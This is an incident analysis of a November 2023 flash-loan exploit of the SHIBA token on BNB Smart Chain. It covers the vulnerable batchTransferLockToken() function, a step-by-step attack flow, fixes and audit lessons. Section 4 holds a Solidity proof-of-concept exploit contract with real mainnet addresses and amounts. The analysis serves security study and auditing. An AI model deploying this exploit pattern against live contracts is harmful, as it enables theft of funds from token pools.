# ShibaToken batchTransferLockToken Access Control Vulnerability Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | SHIBA Token |
| Date | 2023-11-27 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~$31,000 USD |
| Attack Type | Flash Loan + Unvalidated batchTransferLockToken() Airdrop Manipulation |
| CWE | CWE-284 (Improper Access Control) |
| Attacker Address | `0xb9bdc2537C6F4B587A5C81A67e7e3a4e6dDDa189` |
| Attack Contract | `0xda148143379ae54e06d2429a5c80b19d4a9d6734` |
| Vulnerable Contract | `0x13B1F2E227cA6f8e08aC80368fd637f5084F10a5` (SHIBA Token) |
| Fork Block | 33,528,882 |

## 2. Vulnerable Code Analysis

The SHIBA token's `batchTransferLockToken()` function was designed as an airdrop mechanism but contained no validation on the transfer amounts. The attacker borrowed BNB via a DPP flash loan, purchased SHIBA through the ICO `buyByBnb()` function, then passed an arbitrary large amount as a parameter to `batchTransferLockToken()` to drain SHIBA directly from the pair.

```solidity
// Vulnerable pattern: no amount validation in batchTransferLockToken
contract SHIBAToken {
    struct Airdrop {
        address recipient;
        uint256 amount;
    }

    // Vulnerable: allows transfer amounts exceeding the caller's balance
    function batchTransferLockToken(Airdrop[] memory airdrops) external {
        for (uint i = 0; i < airdrops.length; i++) {
            // require(balanceOf(msg.sender) >= airdrops[i].amount) missing
            // allows direct transfer from the pair contract
            _transfer(address(pairAddress), airdrops[i].recipient, airdrops[i].amount);
        }
    }
}
```

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// File: ShibaToken_decompiled.sol
    function batchTransferLockToken((address param0, uint256)[] param1) external {}  // ❌
```

**Vulnerability**: The `batchTransferLockToken()` function could transfer SHIBA directly from the pair contract without checking `msg.sender`'s balance. The attacker acquired access to the function by purchasing a small amount via the ICO, then transferred the pair's entire SHIBA holdings to their own address.

## 3. Attack Flow

```
Attacker [0xb9bdc2537C6F4B587A5C81A67e7e3a4e6dDDa189]
  │
  ├─1─▶ DPPOracle.flashLoan(20 BNB)
  │      Borrow BNB via DODO DPP flash loan
  │      Triggers DPPFlashLoanCall callback
  │
  ├─2─▶ WBNB.withdraw(20 BNB)
  │      Convert WBNB → BNB
  │
  ├─3─▶ SHIBAToken.buyByBnb{value: 20 BNB}(address(0))
  │      [SHIBA: 0x13B1F2E227cA6f8e08aC80368fd637f5084F10a5]
  │      Purchase small amount of SHIBA via ICO
  │
  ├─4─▶ SHIBAToken.batchTransferLockToken([
  │          Airdrop(address(pairAddress), 507,677,278,570... SHIBA)
  │      ])
  │      Drain large amount of SHIBA directly from the pair
  │      No amount validation → entire pair balance transferred
  │
  ├─5─▶ pairAddress.swap(0, 30948..., address(this), "")
  │      [SHIBA/WBNB Pair: xa19d...]
  │      Extract additional WBNB from the imbalanced pair
  │
  ├─6─▶ PancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
  │          SHIBA → BNB)
  │      Swap all remaining SHIBA back to BNB
  │
  └─7─▶ WBNB.transfer(DPPOracle, 20 BNB)
         Repay flash loan + realize ~$31,000 profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface ISHIBAToken {
    struct Airdrop { address recipient; uint256 amount; }
    function buyByBnb(address referral) external payable;
    function batchTransferLockToken(Airdrop[] memory airdrops) external;
}

contract ShibaTokenExploit {
    IWBNB xbb4c = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    ISHIBAToken x13b1 = ISHIBAToken(0x13B1F2E227cA6f8e08aC80368fd637f5084F10a5);
    IUniswapV2Pair xa19d; // SHIBA/WBNB pair
    IUniswapV2Router x10ed = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IDPPOracle xfeaf = IDPPOracle(/*DPP Oracle*/);
    address x0000 = address(0);

    function testExploit() external {
        xfeaf.flashLoan(20_000_000_000_000_000_000, 0, address(this), "");
    }

    function DPPFlashLoanCall(address, uint256, uint256, bytes memory) public {
        // Participate in ICO with BNB
        xbb4c.withdraw(20_000_000_000_000_000_000);
        x13b1.buyByBnb{value: 20_000_000_000_000_000_000}(x0000);

        // Transfer entire pair balance via batchTransferLockToken
        ISHIBAToken.Airdrop[] memory airdrops = new ISHIBAToken.Airdrop[](1);
        airdrops[0] = ISHIBAToken.Airdrop(address(xa19d), 507_677_278_570_125_202_361_500_000);
        x13b1.batchTransferLockToken(airdrops);

        // Swap additional WBNB from the pair
        xa19d.swap(0, 30_948_073_916_467_640_719_090, address(this), "");

        // Swap SHIBA back to BNB
        address[] memory path2 = new address[](2);
        path2[0] = address(x13b1);
        path2[1] = address(xbb4c);
        x10ed.swapExactTokensForETHSupportingFeeOnTransferTokens(
            30_948_073_916_467_640_719_090, 0, path2, address(this), 1_700_095_314
        );

        // Repay flash loan
        xbb4c.transfer(address(xfeaf), 20_000_000_000_000_000_000);
    }

    receive() external payable {}
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-284 (Improper Access Control) |
| Vulnerability Type | batchTransferLockToken() missing amount validation, arbitrary transfer from pair |
| Impact Scope | Entire SHIBA balance of the SHIBA/WBNB PancakeSwap pair |
| Explorer | [BSCscan](https://bscscan.com/address/0x13B1F2E227cA6f8e08aC80368fd637f5084F10a5) |

## 6. Security Recommendations

```solidity
// Fix 1: Validate caller's balance
function batchTransferLockToken(Airdrop[] memory airdrops) external {
    uint256 totalAmount = 0;
    for (uint i = 0; i < airdrops.length; i++) {
        totalAmount += airdrops[i].amount;
    }
    require(balanceOf(msg.sender) >= totalAmount, "Insufficient balance");

    for (uint i = 0; i < airdrops.length; i++) {
        _transfer(msg.sender, airdrops[i].recipient, airdrops[i].amount); // transfer from msg.sender
    }
}

// Fix 2: Restrict airdrop source to a dedicated airdrop pool, not the pair
address public airdropPool;

function batchTransferLockToken(Airdrop[] memory airdrops) external onlyOwner {
    for (uint i = 0; i < airdrops.length; i++) {
        _transfer(airdropPool, airdrops[i].recipient, airdrops[i].amount);
    }
}

// Fix 3: Do not hardcode the transfer source as the pair
// _transfer(address(pairAddress), ...) directly manipulates pair balances and is dangerous
// Airdrops should always be distributed from admin-held supply
```

## 7. Lessons Learned

1. **Validate Airdrop Source**: If an airdrop function's token source is an AMM pair contract, an attacker can exploit it to transfer tokens out of the pair without authorization. Airdrops must only be distributed from a dedicated address.
2. **Amount Validation for Batch Transfers**: Batch transfer functions like `batchTransferLockToken` that accept arbitrary amounts as parameters must always validate the sender's balance.
3. **ICO and Airdrop Function Coupling**: The pattern where an attacker gains access to an airdrop function through a small ICO purchase is frequently observed in small-cap BSC tokens. Granting airdrop privileges based on ICO participation is a dangerous design choice.
4. **Auditing Small-Cap BSC Tokens**: Small-cap tokens with custom functions such as `buyByBnb` and `batchTransferLockToken` must have attack scenarios combining these with flash loans reviewed during audit.